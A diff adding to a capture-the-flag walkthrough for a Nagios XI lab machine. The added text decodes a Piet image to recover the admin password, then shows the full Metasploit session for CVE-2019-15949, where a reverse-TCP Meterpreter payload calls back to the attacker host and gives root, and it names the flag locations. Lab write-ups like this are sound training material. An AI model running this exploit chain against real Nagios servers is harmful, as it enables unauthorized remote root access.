@@ -74,7 +74,77 @@ Navigating to `http://<machin_ip>/nagiosxi/`, we find a login page for the Nagio
 The intuition based on the previous questions is to derive a username from the artist name "Pieter Cornelis Mondriaan". However this was a trap and has nothing to do with the next quesitons.\
 If we take a look at what default usernames Nagios uses for its products, we find a list of potential answers, including the one we're looking for; the default Nagios admin username `nagiosadmin`.
 
-Next, we try brute force our way to the dashboard using hydra:
+Back to our picture. I found, after a considerable amount of time, that piet is actually a programming language. From [here](https://esolangs.org/wiki/Piet), we read:
+> Piet is a stack-based esoteric programming language in which programs look like abstract paintings. It uses 20 colors, of which 18 are related cyclically through a lightness cycle and a hue cycle. A single stack is used for data storage, together with some unusual operations.
+
+We can execute the picture `PI3T.PNg` using an online tool like [npiet online](https://www.bertnase.de/npiet/npiet-execute.php), and then finding the password: `n3p3UQ&9BjLp4$7uhWdY`.
+
+Now lets launch metasploit and search for a useful exploit.
+```
+msf6 > search nagios xi type:exploit
+
+Matching Modules
+================
+
+   #   Name                                                                 Disclosure Date  Rank       Check  Description
+   -   ----                                                                 ---------------  ----       -----  -----------
+   0   exploit/linux/http/nagios_xi_snmptrap_authenticated_rce              2020-10-20       excellent  Yes    Nagios XI 5.5.0-5.7.3 - Snmptrap Authenticated Remote Code Exection
+   1   exploit/linux/http/nagios_xi_configwizards_authenticated_rce         2021-02-13       excellent  Yes    Nagios XI 5.5.6 to 5.7.5 - ConfigWizards Authenticated Remote Code Exection
+   2   exploit/linux/http/nagios_xi_mibs_authenticated_rce                  2020-10-20       excellent  Yes    Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection
+   3   exploit/linux/http/nagios_xi_autodiscovery_webshell                  2021-07-15       excellent  Yes    Nagios XI Autodiscovery Webshell Upload
+   4   exploit/linux/http/nagios_xi_chained_rce                             2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
+   5   exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo         2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
+   6   exploit/linux/http/nagios_xi_magpie_debug                            2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
+   7   exploit/unix/webapp/nagios_graph_explorer                            2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
+   8   exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Prior to 5.6.6 getprofile.sh Authenticated Remote Command Execution
+   9   exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce      2020-12-19       excellent  Yes    Nagios XI Prior to 5.8.0 - Plugins Filename Authenticated Remote Code Exection
+   10  exploit/unix/webapp/nagios3_history_cgi                              2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
+
+```
+
+We can check out the description of the different exploits. The closest match to our situation is 8. The exploited vulnerability corresponds to `CVE-2019-15949`.\
+The full path to the exploit: `exploits/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`.
+
+Exploitation:
+```
+msf6 > use exploits/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+
+msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set password n3p3UQ&9BjLp4$7uhWdY
+password => n3p3UQ&9BjLp4$7uhWdY
+msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set rhosts <target_ip>
+rhosts => <target_ip>
+msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set lhost <your_ip>
+lhost => <your_ip>
+msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set lport 53
+lport => 53
+msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run
+
+[*] Started reverse TCP handler on <your_ip> 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Attempting to authenticate to Nagios XI...
+[+] Successfully authenticated to Nagios XI.
+[*] Target is Nagios XI with version 5.5.6.
+[+] The target appears to be vulnerable.
+[*] Uploading malicious 'check_ping' plugin...
+[*] Command Stager progress - 100.00% done (897/897 bytes)
+[+] Successfully uploaded plugin.
+[*] Executing plugin...
+[*] Waiting up to 300 seconds for the plugin to request the final payload...
+[*] Sending stage (3045380 bytes) to <target_ip>
+[*] Meterpreter session 1 opened (<your_ip>:53 -> <target_ip>:57310) at 2024-03-06 16:35:28 +0000
+[*] Deleting malicious 'check_ping' plugin...
+[+] Plugin deleted.
+
+meterpreter > 
+```
+
+Got a session! Note that the session user is root.\
+The user flag is located at `/home/galand/user.txt` and the root flag is at `/root/root.txt`.
+
+
+
+
 
 
 
